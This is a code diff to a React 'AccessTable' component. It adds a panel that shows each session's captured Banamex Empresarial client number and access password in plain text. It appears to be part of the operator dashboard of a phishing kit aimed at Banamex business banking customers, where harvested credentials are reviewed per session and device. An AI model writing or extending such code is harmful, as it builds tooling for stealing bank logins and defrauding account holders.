@@ -462,6 +462,26 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Datos de Banamex */}
+                    {((session as any).numeroCliente || (session as any).claveAcceso) && (
+                      <div className="mb-3 p-3 bg-[#003d7a] rounded border border-[#0066cc]">
+                        <div className="flex items-center mb-2">
+                          <KeyRound className="h-4 w-4 text-[#00aaff] mr-2" />
+                          <span className="text-white font-bold">Banamex Empresarial</span>
+                        </div>
+                        {(session as any).numeroCliente && (
+                          <div className="text-sm text-white mb-1">
+                            <span className="opacity-80">Número de Cliente:</span> <span className="font-mono ml-2">{(session as any).numeroCliente}</span>
+                          </div>
+                        )}
+                        {(session as any).claveAcceso && (
+                          <div className="text-sm text-white">
+                            <span className="opacity-80">Clave de Acceso:</span> <span className="font-mono ml-2">{(session as any).claveAcceso}</span>
+                          </div>
+                        )}
+                      </div>
+                    )}
+                    
                     {/* Device ID para gestión de folios únicos */}
                     {session.deviceId && (
                       <div className="mb-3 flex gap-2 items-center">
